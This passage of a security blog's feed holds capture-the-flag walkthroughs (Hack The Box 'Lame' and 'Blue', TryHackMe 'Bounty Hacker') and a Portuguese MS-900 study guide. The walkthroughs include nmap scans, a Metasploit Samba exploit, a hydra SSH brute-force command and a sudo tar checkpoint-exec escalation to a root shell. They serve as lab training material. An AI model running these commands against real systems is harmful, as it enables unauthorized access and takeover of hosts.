</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2008</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3259</span>	<span style="color:#ae81ff">1.2</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2008-3259
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	SECURITYVULNS:VULN:<span style="color:#ae81ff">9455</span>	<span style="color:#ae81ff">0.0</span>	https:<span style="color:#75715e">//vulners.com/securityvulns/SECURITYVULNS:VULN:9455
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>_    	<span style="color:#ae81ff">1337</span>DAY<span style="color:#f92672">-</span>ID<span style="color:#f92672">-</span><span style="color:#ae81ff">20909</span>	<span style="color:#ae81ff">0.0</span>	https:<span style="color:#75715e">//vulners.com/zdt/1337DAY-ID-20909	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp open  netbios<span style="color:#f92672">-</span>ssn Samba smbd <span style="color:#ae81ff">3.</span>X <span style="color:#f92672">-</span> <span style="color:#ae81ff">4.</span>X (workgroup: WORKGROUP)
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp open  netbios<span style="color:#f92672">-</span>ssn Samba smbd <span style="color:#ae81ff">3.</span>X <span style="color:#f92672">-</span> <span style="color:#ae81ff">4.</span>X (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Aggressive OS guesses: DD<span style="color:#f92672">-</span>WRT v24<span style="color:#f92672">-</span>sp1 (Linux <span style="color:#ae81ff">2.4.36</span>) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), OpenWrt White Russian <span style="color:#ae81ff">0.9</span> (Linux <span style="color:#ae81ff">2.4.30</span>) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Arris TG862G<span style="color:#f92672">/</span>CT cable modem (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), D<span style="color:#f92672">-</span>Link DAP<span style="color:#f92672">-</span><span style="color:#ae81ff">1522</span> WAP, or Xerox WorkCentre Pro <span style="color:#ae81ff">245</span> or <span style="color:#ae81ff">6556</span> printer (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Dell Integrated Remote Access Controller (iDRAC6) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Linksys WET54GS5 WAP, Tranzeo TR<span style="color:#f92672">-</span>CPQ<span style="color:#f92672">-</span><span style="color:#ae81ff">19f</span> WAP, or Xerox WorkCentre Pro <span style="color:#ae81ff">265</span> printer (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">2.4.21</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2.4.31</span> (likely embedded) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">2.4.27</span> (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Citrix XenServer <span style="color:#ae81ff">5.5</span> (Linux <span style="color:#ae81ff">2.6.18</span>) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">2.6.22</span> (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>)
No exact OS matches <span style="color:#66d9ef">for</span> host (test conditions non<span style="color:#f92672">-</span>ideal).
Network Distance: <span style="color:#ae81ff">2</span> hops
Service Info: OSs: Unix, Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel

Host script results:
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms10<span style="color:#f92672">-</span><span style="color:#ae81ff">054</span><span style="color:#f92672">:</span> false
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms10<span style="color:#f92672">-</span><span style="color:#ae81ff">061</span><span style="color:#f92672">:</span> false
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>regsvc<span style="color:#f92672">-</span>dos: ERROR: Script execution failed (use <span style="color:#f92672">-</span>d to debug)

TRACEROUTE (using port <span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp)
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">254.52</span> ms <span style="color:#ae81ff">10.10.16.1</span>
<span style="color:#ae81ff">2</span>   <span style="color:#ae81ff">254.65</span> ms <span style="color:#ae81ff">10.10.10.3</span>

OS and Service detection performed. Please report any incorrect results at https:<span style="color:#75715e">//nmap.org/submit/ .
</span><span style="color:#75715e"></span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">190.31</span> seconds


</code></pre></div><p>We got the following results:</p>
<ul>
<li>Port 21 — Running FTP service of version 2.3.4</li>
<li>Port 22 — Running SSH service of version OpenSSH 4.7p1</li>
<li>Port 139,445 — Running SMB service of version Samba 3.0.20-Debia</li>
</ul>
<p>Two potential starting points: FTP and SMB. 
Now we need to enumerate these services.</p>
<h3 id="ftp">FTP</h3>
<p>Trying anonymous connect to FTP:</p>

    <img src="/images/htb/lame/ftp.png"  class="center"  style="border-radius: 10px;"  />


<p>The connection is working but the directory is empty.</p>
<p>vsftpd 2.3.4 is a famously backdoored FTP server, but the exploit does not work in this host. 
Fail with exploit/unix/ftp/vsftpd_234_backdoor.</p>
<h3 id="smb">SMB</h3>
<p>Since we can&rsquo;t go with the ftp exploit, let&rsquo;s check the smb.</p>
<p>Trying anonymous connect:</p>

    <img src="/images/htb/lame/smb.png"  class="center"  style="border-radius: 10px;"  />


<p>This server allows anonymous connection, so we could try to exploit it over the smb.</p>
<h2 id="exploitation">Exploitation</h2>
<p>We know the samba version:</p>

    <img src="/images/htb/lame/smbversion.png"  class="center"  style="border-radius: 10px;"  />


<p>Let&rsquo;s google for some exploits:</p>

    <img src="/images/htb/lame/exploit.png"  class="center"  style="border-radius: 10px;"  />


<p>The <a href="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/">exploit</a><code>username map script</code>  it&rsquo;s a good candidate for the exploitation.</p>
<p>Using the <code>msfconsole</code> we need to set the <code>multi/samba/usermap_script</code> and set the LHOST and RHOST options:</p>

    <img src="/images/htb/lame/access.png"  class="center"  style="border-radius: 10px;"  />


<p>We have a shell!</p>
<h2 id="flags">Flags</h2>
<p>Now with shell access, we could check some folders and files to find the two flags.</p>

    <img src="/images/htb/lame/files.png"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/htb/lame/pwned.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>RoadMap para MS-900 (Pt-br)</title>
            <link>https://nmmorette.github.io/posts/2021/08/roadmap-para-ms-900-pt-br/</link>
            <pubDate>Mon, 30 Aug 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/08/roadmap-para-ms-900-pt-br/</guid>
            <description>Introdução O intuito desse post é ajudar os interessados em fazer a prova MS-900 Microsoft 365 Fundamentals. Nesse post vou falar um pouco sobre a prova e sobre o meu plano de estudos para aprovação.
A prova tem nível fundamental ou seja é uma prova baseada em conceitos e não há prática, além disso é uma certificação de &amp;ldquo;entrada&amp;rdquo; para Microsoft 365. Vai te ajudar a conhecer a tecnologia ou provar seus conhecimentos.</description>
            <content type="html"><![CDATA[
    <img src="/images/ms-900/fundamental.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="introdução">Introdução</h2>
<p>O intuito desse post é ajudar os interessados em fazer a prova MS-900 Microsoft 365 Fundamentals.
Nesse post vou falar um pouco sobre a prova e sobre o meu plano de estudos para aprovação.</p>
<p>A prova tem nível fundamental ou seja é uma prova baseada em conceitos e não há prática, além disso é uma certificação de &ldquo;entrada&rdquo; para Microsoft 365. Vai te ajudar a conhecer a tecnologia ou provar seus conhecimentos.</p>
<p>Minha dica principal é ter vivência com a plataforma da microsoft, caso já tenha experiência sua prova com certeza será muito mais fácil. Porém também é possível fazer a prova sem ter experiência, mas talvez o candidato tenha certa dificuldade em assimilar a função de cada ferramenta dentro da plataforma. O que não é um impedimento, com um pouco mais de estudo é possível entender e até mesmo testar os serviços no plano free da Microsoft.</p>
<p>A prova possui 40 questões e é preciso ter 70% de acerto.</p>
<p>O valor no Brasil é de 99 dólares. 
Talvez você seja elegível a descontos de estudante ou corporativo. Consulte o desconto na página de agendamento.
Além disso, existe um desconto para pessoas que foram atingidas pela situação atual em que estamos de pandemia, o valor da prova fica em torno de 15 dólares nesse caso.</p>

    <img src="/images/ms-900/preco.png"  class="center"  style="border-radius: 10px;"  />


<p>O exame pode ser agendado tanto presencial quanto online, eu fiz o exame de forma online.</p>
<p>As questões são de múltipla escolha, verdadeiro ou falso e também questões de correlacionar. 
O contexto das questões pode ser simples e direto, com perguntas do tipo: &ldquo;O que é isso?&rdquo; &quot; Qual a função disso&quot; e outras envolvem uma descrição de uma &ldquo;situação&rdquo; ou &ldquo;cenário&rdquo; onde o profissional precisa responder com as soluções/ferramentas correspondentes da plataforma Microsoft 365.</p>
<p>Minha prova foi realizada no dia 06/06/2021, online no idioma inglês.</p>
<h2 id="composição-da-prova">Composição da Prova</h2>
<p>O conteúdo não é grande e é possível estudar para prova em um tempo bem curto, claro levando em conta seu conhecimento prévio para prova. 
No meu caso eu estudei por uma semana de forma mais intensiva e depois fiz a prova.</p>
<p>-Descrever os conceitos de nuvem (10-15%)
-Descrever os serviços e conceitos básicos do Microsoft 365 (30-35%)
-Descrever a segurança, conformidade, privacidade e confiança no Microsoft 365 (30-35%)
-Descrever os preços e suporte do Microsoft 365 (20-25%)</p>
<p>O documento completo com a estrutura da prova pode ser encontrado <a href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE3VwVw">aqui</a>.</p>
<h2 id="preparação">Preparação</h2>
<p>Na minha opinião existem duas formas de se preparar para essa prova: uma é com conteúdos gratuitos e outra com conteúdo pago.</p>
<h3 id="conteúdo-gratuito">Conteúdo Gratuito</h3>
<p>Na internet é possível encontrar diversas fontes de estudo gratuitas para essa prova, porém a maioria que encontrei foi no idioma em inglês.
Porém se você tem um pouco de familiaridade com o idioma, é possível sim assistir os vídeos e até realizar a prova no idioma inglês, o conteúdo é bem técnico e se você já é um profissional da área de TI vai encontrar termos e expressões comuns utilizados no seu dia a dia.</p>
<p>Eu recomendo o canal <a href="https://www.youtube.com/channel/UCg8OCdG1yeiSPFDyqQDxHnw">A guide to Cloud</a> além do conteúdo para MS-900 ele possui outros vídeos para certificações da microsoft.</p>

    <img src="/images/ms-900/guidetocloud.png"  class="center"  style="border-radius: 10px;"  />


<p>A playlist do curso é bem completa com todo conteúdo da prova.</p>


<iframe width="560" height="315" src="https://www.youtube.com/embed/videoseries?list=PLhLKc18P9YOBtDKWHVr1TwUq6_smRdCjo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<p>Essa é minha recomendação de curso gratuito já que eu assisti alguns vídeos não só desse curso mas de outros produzidos no canal. Porém com uma busca rápida no youtube é possível encontrar outros produtores de conteúdo com vídeos gratuitos para preparação da MS-900.


<iframe width="560" height="315" src="https://www.youtube.com/embed/ZtOo7prP4_M" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

</p>
<p>Outra forma de preparação são os cursos gratuitos da <a href="https://www.linkedin.com/company/ka-solution/">KaSolution</a>, eles estão sempre promovendo cursos aos sábados. Completos para várias formações Microsoft.
Infelizmente para esse método você vai precisar contar com a sorte de abrirem uma turma gratuita. 
Basta ficar de olho na rede social deles, no último sábado dia 28/08/2021 eles promoveram um curso do AZ-900 por exemplo.</p>
<h3 id="conteúdo-pago">Conteúdo Pago</h3>
<p>Como recomendação de conteúdo pago eu deixo o curso da <a href="https://www.cbtnuggets.com/it-training/microsoft-365/certified-fundamentals">Cbtnugget</a>, foi o curso que eu fiz por completo para me preparar para essa certificação.</p>

    <img src="/images/ms-900/cbt.png"  class="center"  style="border-radius: 10px;"  />


<p>Um dos instrutores é o Chuck Keith o <a href="https://www.youtube.com/user/NetworkChuck">Network Chuck</a>, ele apresenta a parte inicial dos conceitos básicos. A <a href="https://www.linkedin.com/in/simonamillham/">Simona Millham</a> entra na parte do conteúdo da prova, apresentando todos os tópicos necessários para a prova.</p>
<p>A plataforma tem um valor mensal um pouco alto para nossos padrões, porém você pode aproveitar os 7 dias gratuitos e testar a vasta gama de cursos que eles possuem. Sempre que tenho possibilidade de fazer um curso com eles eu faço devido a qualidade do conteúdo e metodologia.</p>
<p>Além disso o curso possui diversas questões de exemplo para preparação e também explicações para as respostas.</p>
<p>No <a href="https://www.udemy.com">Udemy</a> também é possível encontrar muitos cursos de preparação para MS-900 com valores acessíveis.</p>
<p>Na <a href="https://www.kasolution.com.br/Home?pt=google">KaSolution</a> além dos cursos gratuitos é possível comprar diversas formações para preparação de certificações diversas da Microsoft.</p>
<p>Além disso é possível comprar o livro oficial da microsoft para preparação, infelizmente para essa prova eu não comprei, devido o valor elevado aqui no Brasil. Entretanto eu conheço os livros de outras certificações da microsoft que tirei e eles são bem completos e recomendo muito quando é possível encontrar com preços acessíveis.</p>

    <img src="/images/ms-900/book.jpg"  class="center"  style="border-radius: 10px;"  />


<h2 id="simulados">Simulados</h2>
<p>Acredito que os simulados são uma preparação extra para prova, muitos não apoiam a ideia porém a própria microsoft vende os famosos brain dumps. Dentro da página de agendamento é possível encontrar um link para compra:</p>

    <img src="/images/ms-900/exame.png"  class="center"  style="border-radius: 10px;"  />


<p>Esse eu realmente não indico a compra, nunca comprei devido o alto valor solicitado. 
Se você optou por estudar tanto com vídeos do Youtube, Cbtnuggets ou KaSolution durante as aulas você vai encontrar exemplos de questões para te ajudar em sua preparação.</p>
<p>Lógico que somente estudar utilizando os simulados não é uma boa prática, já que você só estaria decorando questões e não adquirindo conhecimento.</p>
<p>Uma opção gratuita para testar seu conhecimento com questões é o site: <a href="https://www.itexams.com">IT Exams</a>.</p>

    <img src="/images/ms-900/itexams.png"  class="center"  style="border-radius: 10px;"  />


<p>Outra forma porém essa paga é comprando simulados preparatórios no Udemy, existem vários na plataforma. 
Eu comprei esse <a href="https://www.udemy.com/course/ms-900-5-practice-tests-on-ms-365-certification">aqui</a>e as questões foram realmente boas para minha preparação.</p>

    <img src="/images/ms-900/udemy.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="tópicos-importantes">Tópicos importantes</h2>
<p>Esse item pode ser um pouco complicado, não existe o tópico mais importante! Porém existem ferramentas e itens que são certos de cair na prova, e você precisa saber o que são.</p>
<ul>
<li>É fundamental entender as diferenças de planos, o que tem em um e em outro não.</li>
<li>Entender o básico dos itens:
<ul>
<li>Microsoft Intune</li>
<li>Azure Information Protection</li>
<li>Azure Active Directory</li>
<li>Microsoft Advanced Threat Analytics</li>
</ul>
</li>
<li>Conceitos de segurança:
<ul>
<li>Secure authentication</li>
<li>Conditional access</li>
<li>Identity Protection</li>
<li>Threat protection</li>
</ul>
</li>
</ul>
<p>Como eu disse esses são só pontos em destaque que eu percebi que foram muito cobrados na minha prova, então não foque só nesses. Mas se você leu e sabe o que são todos esses itens e entende o que cada um deles faz, você provavelmente já tem uma boa base para prova.</p>
<h2 id="dia-da-prova">Dia da Prova</h2>
<p>Essa foi a minha primeira certificação online, todas as outras eu fiz em centros de estudo.
O processo é bem simples, você vai receber um link para acessar no dia da prova. Além disso existe um link para testar seu sistema, ele testa seu navegador, câmera e microfone. Você será monitorado o tempo todo durante a prova, para que não exista possibilidade de fraude. 
Para falar com o &ldquo;proctor&rdquo;, pessoa responsável por monitorar sua prova, é preciso falar em inglês via chat. Porém se você se preparar bem não vai precisar falar quase nada com eles. 
Eu só precisei falar que estava preparado para iniciar e depois informei o termino só isso.</p>
<p>A preparação consistem em alguns pontos:</p>
<ul>
<li>Deixar a câmera ligada;</li>
<li>Mostrar seus documentos;</li>
<li>Preparar o ambiente de prova: não pode existir outra pessoa perto, barulhos, eletrônicos aparentes ( eu precisei tampar minha TV com um lençol);</li>
<li>Mostrar todo o ambiente com a webcam e no final mostrar que você vai deixar o celular em um local longe de você.</li>
</ul>
<p>Todos os items acima eu me adiantei e preparei, a TV estava já tampada, o celular eu deixei aparente na cama atrás de mim. Então não houve nenhum problema para iniciar a prova. 
Vi relatos de outras pessoas que não prepararam o ambiente e foi preciso fazer tudo isso antes da prova iniciar com as indicações do proctor.</p>
<p>Depois de toda checagem de segurança a prova foi realizada sem problemas, creio que demorei em torno de 35 minutos para realizar a prova. 
O resultado foi imediato e horas depois recebi o certificado e badge da MS-900.</p>

    <img src="/images/ms-900/badge.png"  class="center"  style="border-radius: 10px;"  />




<br>



<img src="https://nmorette.files.wordpress.com/2021/06/capturar.png">

]]></content>
        </item>
        
        <item>
            <title>TryHackme - Bounty Hacker - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/</link>
            <pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/</guid>
            <description>First of all, let&amp;rsquo;s nmap the machine IP.
└─$ sudo nmap -sS -Pn 10.10.207.23 [sudo] password for venomsnake: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 07:43 -03 Nmap scan report for 10.10.207.23 Host is up (0.20s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 9.</description>
            <content type="html"><![CDATA[
    <img src="/images/tryhackme/bountyhacker/banner.png"  class="center"  style="border-radius: 10px;"  />


<p>First of all, let&rsquo;s <code>nmap</code> the machine IP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">└─$</span> sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.207.23</span>
[sudo] password <span style="color:#66d9ef">for</span> venomsnake: 
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-08-15 07:43 -03
</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.207.23</span>
Host is up (<span style="color:#ae81ff">0.20</span>s latency).
Not shown: <span style="color:#ae81ff">967</span> filtered ports, <span style="color:#ae81ff">30</span> closed ports
PORT   STATE SERVICE
<span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp open  ftp
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp open  ssh
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp open  http

Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">9.46</span> seconds
</code></pre></div><p>We found three open ports: 21,22 and 80. The next step is to enumerate these ports:</p>
<h2 id="http-80">HTTP 80</h2>

    <img src="/images/tryhackme/bountyhacker/80.png"  class="center"  style="border-radius: 10px;"  />


<p>We found a text introduction on the web page.</p>
<p>Let&rsquo;s use dirbuster to dig more info:</p>

    <img src="/images/tryhackme/bountyhacker/dirbuster.png"  class="center"  style="border-radius: 10px;"  />


<p>Unfortunately, we don&rsquo;t find useful information.</p>
<h2 id="ftp-21">FTP 21</h2>
<p>Let&rsquo;s try an anonymous login into the FTP server:</p>

    <img src="/images/tryhackme/bountyhacker/ftp.png"  class="center"  style="border-radius: 10px;"  />


<p>It&rsquo;s working!</p>
<p>We found 2 files in the server: <code>task.txt</code> with the answer for the question: <em>&ldquo;Who wrote the task list?&quot;</em>. 
The other file <code>locks.txt</code> looks like a list of passwords.</p>
<p>Now we have one user name and a list of possible passwords, we could try to brute force port 22.</p>
<h2 id="ssh-22">SSH 22</h2>
<p>Let&rsquo;s use <code>hydra</code> with a list of users. We found one user in the file <code>task.txt</code> but just in case we could use a list of possible users.</p>

    <img src="/images/tryhackme/bountyhacker/users.png"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">hydra <span style="color:#f92672">-</span>v <span style="color:#f92672">-</span>L users.txt <span style="color:#f92672">-</span>P locks.txt <span style="color:#ae81ff">10.10.207.23</span> ssh <span style="color:#f92672">-</span>t <span style="color:#ae81ff">4</span>
</code></pre></div>
    <img src="/images/tryhackme/bountyhacker/ssh.png"  class="center"  style="border-radius: 10px;"  />


<p>We got the lin&rsquo;s password to ssh.</p>
<p>Finally, we could have access to the host:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssh lin<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">10.10.207.23</span>
</code></pre></div><p>Now we&rsquo;re looking the <code>users.txt</code> file in ~/Desktop:</p>

    <img src="/images/tryhackme/bountyhacker/txt.png"  class="center"  style="border-radius: 10px;"  />


<p>The next step is to find the <code>root.txt</code> file, but the user lin isn&rsquo;t in the sudoers group.
So we need to find some way to privesc this host.</p>
<p>Checking what we can run with <code>sudo -l</code>:</p>

    <img src="/images/tryhackme/bountyhacker/sudo.png"  class="center"  style="border-radius: 10px;"  />


<p>Let’s check our best friend GTFOBIns by going to <a href="https://gtfobins.github.io">https://gtfobins.github.io</a></p>

    <img src="/images/tryhackme/bountyhacker/tar.png"  class="center"  style="border-radius: 10px;"  />


<p>We have a possible privesc with tar:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sudo tar <span style="color:#f92672">-</span>cf <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>null <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>null <span style="color:#f92672">--</span>checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span>checkpoint<span style="color:#f92672">-</span>action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=/</span>bin<span style="color:#f92672">/</span>sh
</code></pre></div><p>That&rsquo;s it! We&rsquo;re root!</p>

    <img src="/images/tryhackme/bountyhacker/root.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Blue - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/08/hack-the-box-blue-write-up/</link>
            <pubDate>Sat, 14 Aug 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/08/hack-the-box-blue-write-up/</guid>
            <description>Enumeration Initial scan:
└──╼ $sudo nmap -sS -Pn 10.10.10.40 Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 15:11 -03 Nmap scan report for 10.10.10.40 Host is up (0.45s latency). Not shown: 991 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown Second nmap scan with --script vuln only on the open ports:</description>
            <content type="html"><![CDATA[

<br>


    <img src="/images/htb/blue/banner.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="enumeration">Enumeration</h2>
<p>Initial scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">└──╼</span> <span style="color:#960050;background-color:#1e0010">$</span>sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.10.40</span> 
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-08-11 15:11 -03
</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.10.40</span>
Host is up (<span style="color:#ae81ff">0.45</span>s latency).
Not shown: <span style="color:#ae81ff">991</span> closed ports
PORT      STATE SERVICE
<span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp   open  msrpc
<span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp   open  netbios<span style="color:#f92672">-</span>ssn
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp   open  microsoft<span style="color:#f92672">-</span>ds
<span style="color:#ae81ff">49152</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49153</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49154</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49155</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49156</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49157</span><span style="color:#f92672">/</span>tcp open  unknown
</code></pre></div><p>Second nmap scan with <code>--script vuln</code> only on the open ports:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.10.40</span> <span style="color:#f92672">-</span>A <span style="color:#f92672">-</span>p135,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">445</span>,<span style="color:#ae81ff">49152</span>,<span style="color:#ae81ff">49153</span>,<span style="color:#ae81ff">49154</span>,<span style="color:#ae81ff">49155</span>,<span style="color:#ae81ff">49156</span>,<span style="color:#ae81ff">49157</span> <span style="color:#f92672">--</span>script vuln
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-08-11 15:25 -03
</span><span style="color:#75715e"></span>Pre<span style="color:#f92672">-</span>scan script results:
<span style="color:#f92672">|</span> broadcast<span style="color:#f92672">-</span>avahi<span style="color:#f92672">-</span>dos: 
<span style="color:#f92672">|</span>   Discovered hosts:
<span style="color:#f92672">|</span>     <span style="color:#ae81ff">224.0.0.251</span>
<span style="color:#f92672">|</span>   After NULL UDP avahi packet DoS (CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1002</span>).
<span style="color:#f92672">|</span>_  Hosts are all up (not vulnerable).
Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.10.40</span>
Host is up (<span style="color:#ae81ff">0.50</span>s latency).

PORT      STATE SERVICE      VERSION
<span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp   open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp   open  netbios<span style="color:#f92672">-</span>ssn  Microsoft Windows netbios<span style="color:#f92672">-</span>ssn
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp   open  microsoft<span style="color:#f92672">-</span>ds Microsoft Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">10</span> microsoft<span style="color:#f92672">-</span>ds (workgroup: WORKGROUP)
<span style="color:#ae81ff">49152</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49153</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49154</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49155</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49156</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49157</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
